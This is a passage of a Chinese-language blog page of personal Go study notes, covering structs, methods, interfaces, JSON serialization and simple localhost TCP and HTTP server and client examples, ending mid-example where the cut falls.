class="hljs-comment">//&#123;&#125;内可写内容,比如s2:=[]int&#123;1,2,3&#125;,不写的话就是[]int&#123;&#125;,代表建立了一个空切片</span><br></code></pre></td></tr></table></figure><p>s3:&#x3D;make([]int,0)</p><h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main <br><span class="hljs-keyword">import</span>(<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>)<br><span class="hljs-keyword">type</span> student <span class="hljs-keyword">struct</span>&#123;<br>    name <span class="hljs-type">string</span><br>    age <span class="hljs-type">int</span><br>&#125;<br><span class="hljs-comment">//创建对象方式1</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">var</span> p1 student<br>    p1.name=<span class="hljs-string">&quot;yblue&quot;</span><br>    p1.age=<span class="hljs-number">18</span><br>fmt.Printf(<span class="hljs-string">&quot;%#v\n%v\n&quot;</span>, p1, p1)<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">main.student&#123;name:&quot;yblue&quot;, age:18&#125;</span><br><span class="hljs-comment">&#123;yblue 18&#125;</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">//创建对象方式2</span><br>    p2:=student&#123;&#125;<br>    <span class="hljs-comment">/*这里准确的写法是</span><br><span class="hljs-comment">    p2:=student&#123;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    也可以这样</span><br><span class="hljs-comment">    p2:=student&#123;</span><br><span class="hljs-comment">        name: &quot;usr0&quot;,</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    后面必须要跟逗号,   即使是最后一个键值对也要加 </span><br><span class="hljs-comment">    */</span><br>    p2.name=<span class="hljs-string">&quot;usr0&quot;</span><br>fmt.Printf(<span class="hljs-string">&quot;%#v\n%v\n&quot;</span>, p2, p2)<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">main.student&#123;name:&quot;usr0&quot;, age:0&#125;</span><br><span class="hljs-comment">&#123;usr0 0&#125;</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">//创建对象方式3</span><br>    p3:=&amp;student&#123;<br>        name: <span class="hljs-string">&quot;root&quot;</span>,<br>    &#125;<br>fmt.Printf(<span class="hljs-string">&quot;%#v\n%v\n&quot;</span>, p3, p3)    <br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">&amp;main.student&#123;name:&quot;root&quot;, age:0&#125;</span><br><span class="hljs-comment">&amp;&#123;root 0&#125;</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>还有可能有别的创建结构体的方法</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//这个是个常见的错误例子,因为用的是&amp;stu是把每一个m[stu.name]指向了&amp;stu这个地址,而没经过一次循环,这个地址的内容就会变成新的,到最后3个m[stu.name]指向的都会是最后一个的值</span><br><span class="hljs-keyword">type</span> student <span class="hljs-keyword">struct</span> &#123;<br>    name <span class="hljs-type">string</span><br>    age  <span class="hljs-type">int</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    m := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]*student)     <br>    stus := []student&#123;         <span class="hljs-comment">//这里是创建了一个student类型的切片  切片创建是 var s1 []int  这里的student&#123;...&#125;就跟int等价</span><br>        &#123;name: <span class="hljs-string">&quot;pprof.cn&quot;</span>, age: <span class="hljs-number">18</span>&#125;,<br>        &#123;name: <span class="hljs-string">&quot;测试&quot;</span>, age: <span class="hljs-number">23</span>&#125;,<br>        &#123;name: <span class="hljs-string">&quot;博客&quot;</span>, age: <span class="hljs-number">28</span>&#125;,<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> _, stu := <span class="hljs-keyword">range</span> stus &#123;<br>        m[stu.name] = &amp;stu<br>    &#125;<br>    <span class="hljs-keyword">for</span> k, v := <span class="hljs-keyword">range</span> m &#123;<br>        fmt.Println(k, <span class="hljs-string">&quot;=&gt;&quot;</span>, v.name)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="方法和接收"><a href="#方法和接收" class="headerlink" title="方法和接收"></a>方法和接收</h2><p>Go语言中的方法（Method）是一种作用于特定类型变量的函数。这种特定类型变量叫做接收者（Receiver）。<br>跟c++的成员函数差不多,只有对应的接收者(go是结构体,c++是类)才能使用方法&#x2F;成员函数</p><h3 id="自定义函数跟方法的组成区别"><a href="#自定义函数跟方法的组成区别" class="headerlink" title="自定义函数跟方法的组成区别"></a>自定义函数跟方法的组成区别</h3><p>自定义函数是func newPerson(name, city string, age int8) *person {}  func后直接跟自定义的函数名,而方法是要先声明接收者变量和接收者类型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(接收者变量 接收者类型)</span></span> 方法名(参数列表) (返回参数) &#123;<br>    函数体<br>&#125;<br><span class="hljs-comment">//官方建议接收者变量命名为接收者类型的第一个小写字母,比如接收者类型是Study这个结构体,那接收者变量最好命名为s</span><br></code></pre></td></tr></table></figure><p>举个栗子</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//Person 结构体</span><br><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">struct</span> &#123;<br>    name <span class="hljs-type">string</span><br>    age  <span class="hljs-type">int8</span><br>&#125;<br><br><span class="hljs-comment">//NewPerson 构造函数</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewPerson</span><span class="hljs-params">(name <span class="hljs-type">string</span>, age <span class="hljs-type">int8</span>)</span></span> *Person &#123;<br>    <span class="hljs-keyword">return</span> &amp;Person&#123;<br>        name: name,<br>        age:  age,<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//Dream Person做梦的方法</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p Person)</span></span> Dream() &#123;<br>    fmt.Printf(<span class="hljs-string">&quot;%s的梦想是学好Go语言！\n&quot;</span>, p.name)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    p1 := NewPerson(<span class="hljs-string">&quot;测试&quot;</span>, <span class="hljs-number">25</span>)<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    p1:=person&#123;</span><br><span class="hljs-comment">        测试,</span><br><span class="hljs-comment">        25,</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    */</span><br>    p1.Dream()<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="指针类型的接收者"><a href="#指针类型的接收者" class="headerlink" title="指针类型的接收者"></a>指针类型的接收者</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *Person)</span></span> SetAge(newage <span class="hljs-type">int</span>)&#123;   <span class="hljs-comment">//如果这里不是p *Person,那么再次打印时值还是18</span><br>    p.age=newage<br>&#125;<br><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">struct</span>&#123;<br>    age <span class="hljs-type">int</span><br>    name <span class="hljs-type">string</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    p1:=Person&#123;<br>        <span class="hljs-number">18</span>,<br>        <span class="hljs-string">&quot;小明&quot;</span>,<br>    &#125;<br>    fmt.Println(p1.age)<br>    p1.SetAge(<span class="hljs-number">20</span>)<br>    fmt.Println(p1.age)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">interface</span> &#123;<br>GetName()<br>&#125;<br><span class="hljs-keyword">type</span> Student <span class="hljs-keyword">struct</span> &#123;<br>Name <span class="hljs-type">string</span><br>Age  <span class="hljs-type">int</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(stu Student)</span></span> GetName() &#123;<br>fmt.Println(stu.Name)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>s := Student&#123;<br>Name: <span class="hljs-string">&quot;yblue&quot;</span>,<br>Age:  <span class="hljs-number">18</span>,<br>&#125;<br><span class="hljs-keyword">var</span> s1 Person = s<br>s1.GetName()<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="结构体与JSON序列化"><a href="#结构体与JSON序列化" class="headerlink" title="结构体与JSON序列化"></a>结构体与JSON序列化</h3><p>JSON键值对是用来保存JS对象的一种方式，键&#x2F;值对组合中的键名写在前面并用双引号””包裹，使用冒号:分隔，然后紧接着值；多个键值之间使用英文,分隔。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//Student 学生</span><br><span class="hljs-keyword">type</span> Student <span class="hljs-keyword">struct</span> &#123;<br>    ID     <span class="hljs-type">int</span><br>    Gender <span class="hljs-type">string</span><br>    Name   <span class="hljs-type">string</span><br>&#125;<br><br><span class="hljs-comment">//Class 班级</span><br><span class="hljs-keyword">type</span> Class <span class="hljs-keyword">struct</span> &#123;<br>    Title    <span class="hljs-type">string</span><br>    Students []*Student<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    c := &amp;Class&#123;<br>        Title:    <span class="hljs-string">&quot;101&quot;</span>,<br>        Students: <span class="hljs-built_in">make</span>([]*Student, <span class="hljs-number">0</span>, <span class="hljs-number">200</span>),<br>    &#125;<br>    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++ &#123;<br>        stu := &amp;Student&#123;<br>            Name:   fmt.Sprintf(<span class="hljs-string">&quot;stu%02d&quot;</span>, i),<br>            Gender: <span class="hljs-string">&quot;男&quot;</span>,<br>            ID:     i,<br>        &#125;<br>        c.Students = <span class="hljs-built_in">append</span>(c.Students, stu)<br>    &#125;<br>    <span class="hljs-comment">//JSON序列化：结构体--&gt;JSON格式的字符串</span><br>    data, err := json.Marshal(c)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>        fmt.Println(<span class="hljs-string">&quot;json marshal failed&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    fmt.Printf(<span class="hljs-string">&quot;json:%s\n&quot;</span>, data)<br>    <span class="hljs-comment">//JSON反序列化：JSON格式的字符串--&gt;结构体</span><br>    str := <span class="hljs-string">`&#123;&quot;Title&quot;:&quot;101&quot;,&quot;Students&quot;:[&#123;&quot;ID&quot;:0,&quot;Gender&quot;:&quot;男&quot;,&quot;Name&quot;:&quot;stu00&quot;&#125;,&#123;&quot;ID&quot;:1,&quot;Gender&quot;:&quot;男&quot;,&quot;Name&quot;:&quot;stu01&quot;&#125;,&#123;&quot;ID&quot;:2,&quot;Gender&quot;:&quot;男&quot;,&quot;Name&quot;:&quot;stu02&quot;&#125;,&#123;&quot;ID&quot;:3,&quot;Gender&quot;:&quot;男&quot;,&quot;Name&quot;:&quot;stu03&quot;&#125;,&#123;&quot;ID&quot;:4,&quot;Gender&quot;:&quot;男&quot;,&quot;Name&quot;:&quot;stu04&quot;&#125;,&#123;&quot;ID&quot;:5,&quot;Gender&quot;:&quot;男&quot;,&quot;Name&quot;:&quot;stu05&quot;&#125;,&#123;&quot;ID&quot;:6,&quot;Gender&quot;:&quot;男&quot;,&quot;Name&quot;:&quot;stu06&quot;&#125;,&#123;&quot;ID&quot;:7,&quot;Gender&quot;:&quot;男&quot;,&quot;Name&quot;:&quot;stu07&quot;&#125;,&#123;&quot;ID&quot;:8,&quot;Gender&quot;:&quot;男&quot;,&quot;Name&quot;:&quot;stu08&quot;&#125;,&#123;&quot;ID&quot;:9,&quot;Gender&quot;:&quot;男&quot;,&quot;Name&quot;:&quot;stu09&quot;&#125;]&#125;`</span><br>    c1 := &amp;Class&#123;&#125;<br>    err = json.Unmarshal([]<span class="hljs-type">byte</span>(str), c1)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>        fmt.Println(<span class="hljs-string">&quot;json unmarshal failed!&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    fmt.Printf(<span class="hljs-string">&quot;%#v\n&quot;</span>, c1)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="结构体-字段-方法-类型大统一"><a href="#结构体-字段-方法-类型大统一" class="headerlink" title="结构体,字段,方法,类型大统一"></a>结构体,字段,方法,类型大统一</h3><p>理解结构体、字段、方法和类型之间的关系是理解 Go 语言的重要基础。让我用一个简单的例子来说明这些概念之间的关系。</p><p>假设我们想创建一个程序来表示矩形，并能够计算其面积。我们可以使用结构体、字段、方法和类型来完成这个任务。</p><p>首先，我们定义一个矩形的结构体：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Rectangle <span class="hljs-keyword">struct</span> &#123;<br>    Width  <span class="hljs-type">float64</span><br>    Height <span class="hljs-type">float64</span><br>&#125;<br></code></pre></td></tr></table></figure><p>在上面的代码中，我们创建了一个名为 Rectangle 的结构体，它有两个字段：Width 和 Height，分别表示矩形的宽度和高度。</p><p>接下来，我们可以为这个结构体定义一个方法来计算矩形的面积：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(r Rectangle)</span></span> Area() <span class="hljs-type">float64</span> &#123;<br>    <span class="hljs-keyword">return</span> r.Width * r.Height<br>&#125;<br></code></pre></td></tr></table></figure><p>在上面的代码中，我们为 Rectangle 结构体定义了一个名为 Area 的方法。这个方法接收一个 Rectangle 类型的接收者（receiver），并返回一个 float64 类型的面积值。方法可以访问接收者结构体的字段，这里我们用 r.Width 和 r.Height 计算了面积。</p><p>现在，我们可以创建一个 Rectangle 类型的对象，并使用它的 Area 方法来计算面积：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    rect := Rectangle&#123;Width: <span class="hljs-number">5.0</span>, Height: <span class="hljs-number">3.0</span>&#125;<br>    area := rect.Area()<br>    fmt.Printf(<span class="hljs-string">&quot;矩形的面积是: %f\n&quot;</span>, area)<br>&#125;<br></code></pre></td></tr></table></figure><p>在上面的 main 函数中，我们创建了一个 Rectangle 类型的对象 rect，并调用了它的 Area 方法来计算面积。最终，我们打印出了矩形的面积。</p><p>这个例子涵盖了以下概念：</p><p>结构体 (Rectangle)：用于组织相关字段的数据结构。<br>字段 (Width 和 Height)：结构体中的属性或数据成员。<br>方法 (Area())：与特定类型关联的函数，用于执行特定的操作。<br>类型 (Rectangle)：自定义的数据类型，具有自己的字段和方法。<br>希望这个例子有助于你理解结构体、字段、方法和类型之间的关系。如果你有更多问题或需要进一步解释，请随时提问。</p><h1 id="网络编程"><a href="#网络编程" class="headerlink" title="网络编程"></a>网络编程</h1><h2 id="socket"><a href="#socket" class="headerlink" title="socket"></a>socket</h2><p>看不懂搞不明白,过</p><h2 id="tcp网络编程"><a href="#tcp网络编程" class="headerlink" title="tcp网络编程"></a>tcp网络编程</h2><h3 id="创立客户端-client"><a href="#创立客户端-client" class="headerlink" title="创立客户端(client)"></a>创立客户端(client)</h3><p>一个TCP客户端进行TCP通信的流程如下：<br>    1.建立与服务端的链接<br>    2.进行数据收发<br>    3.关闭链接</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;bufio&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;log&quot;</span><br><span class="hljs-string">&quot;net&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br><span class="hljs-string">&quot;strings&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>conn, err := net.Dial(<span class="hljs-string">&quot;tcp&quot;</span>, <span class="hljs-string">&quot;:12345&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalln(err)<br>&#125;<br><span class="hljs-keyword">defer</span> conn.Close()<br>input := bufio.NewReader(os.Stdin)<br><span class="hljs-keyword">for</span> &#123;<br><span class="hljs-comment">//检测用户输入并传递给服务端(send)</span><br>ip, _ := input.ReadString(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>ipinfo := strings.Trim(ip, <span class="hljs-string">&quot;\n\r&quot;</span>)<br><span class="hljs-keyword">if</span> strings.ToUpper(ipinfo) == <span class="hljs-string">&quot;Q&quot;</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>_, err := conn.Write([]<span class="hljs-type">byte</span>(ipinfo)) <span class="hljs-comment">//将用户的输入先强制转换成字节类型的切片,再发送给服务器</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalln(err)<br>&#125;<br><span class="hljs-comment">//接收服务端的消息(recv)</span><br>buf := [<span class="hljs-number">512</span>]<span class="hljs-type">byte</span>&#123;&#125; <span class="hljs-comment">//创建一个字节类型的数组([]里面写length就是数组,没写就是切片),用来存放服务端传递的数据(本例中服务端并未给客户端发送数据)</span><br>n, err := conn.Read(buf[:])<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalln(err)<br>&#125;<br>fmt.Println(<span class="hljs-type">string</span>(buf[:n]))<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="建立服务端-server"><a href="#建立服务端-server" class="headerlink" title="建立服务端(server)"></a>建立服务端(server)</h3><p>TCP服务端程序的处理流程：</p><pre><code class="hljs">1.监听端口2.接收客户端请求建立链接3.创建goroutine处理链接</code></pre><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;bufio&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;log&quot;</span><br><span class="hljs-string">&quot;net&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">process</span><span class="hljs-params">(conn net.Conn)</span></span> &#123;<br><span class="hljs-keyword">defer</span> conn.Close()<br><span class="hljs-comment">//创建读取对象</span><br>reader := bufio.NewReader(conn)<br><span class="hljs-keyword">for</span> &#123;<br><span class="hljs-comment">//建立存储客户端发送请求的数组</span><br>rd := [<span class="hljs-number">512</span>]<span class="hljs-type">byte</span>&#123;&#125;<br><span class="hljs-comment">//向数组写入内容</span><br>n, err := reader.Read(rd[:])<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalln(err)<br>&#125;<br><span class="hljs-comment">//打印读取的内容</span><br>fmt.Println(<span class="hljs-type">string</span>(rd[:n]))<br><span class="hljs-comment">//向客户端发送内容</span><br>recv := fmt.Sprintf(<span class="hljs-string">&quot;你已成功发送,数据为:%s&quot;</span>, <span class="hljs-type">string</span>(rd[:n]))<br>conn.Write([]<span class="hljs-type">byte</span>(recv))<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>listen, err := net.Listen(<span class="hljs-string">&quot;tcp&quot;</span>, <span class="hljs-string">&quot;:12345&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalln(err)<br>&#125;<br><span class="hljs-keyword">for</span> &#123;<br><span class="hljs-comment">//建立连接</span><br>conn, err := listen.Accept()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalln(err)<br>&#125;<br><span class="hljs-keyword">go</span> process(conn)<br>&#125;<br>&#125;   <br></code></pre></td></tr></table></figure><h2 id="UDP网络编程"><a href="#UDP网络编程" class="headerlink" title="UDP网络编程"></a>UDP网络编程</h2><p>就是把前面的tcp换成udp,但教程还给了udp专门的socket的函数,但是感觉没什么大用,碰到再学吧</p><h2 id="tcp黏包"><a href="#tcp黏包" class="headerlink" title="tcp黏包"></a>tcp黏包</h2><p>就是数据发送过多,让数据包重合了</p><h2 id="http编程"><a href="#http编程" class="headerlink" title="http编程"></a>http编程</h2><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">//处理路由,当路由为/index时,触发myHandler的函数进行处理</span><br>http.HandleFunc(<span class="hljs-string">&quot;/index&quot;</span>, myHandler)<br><span class="hljs-comment">//这里nil的意思是,除了127.0.0.1:1234/index以外的url访问,都会使用默认处理规则</span><br>http.ListenAndServe(<span class="hljs-string">&quot;127.0.0.1:1234&quot;</span>, <span class="hljs-literal">nil</span>)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">myHandler</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br><span class="hljs-keyword">defer</span> r.Body.Close()<br><span class="hljs-comment">//这里的w跟r是在有外界访问127.0.0.1:1234/index时默认传递的参数</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">w http.ResponseWriter 是一个用于向客户端发送 HTTP 响应的接口。通过这个接口，您可以设置响应头、写入响应体等。</span><br><span 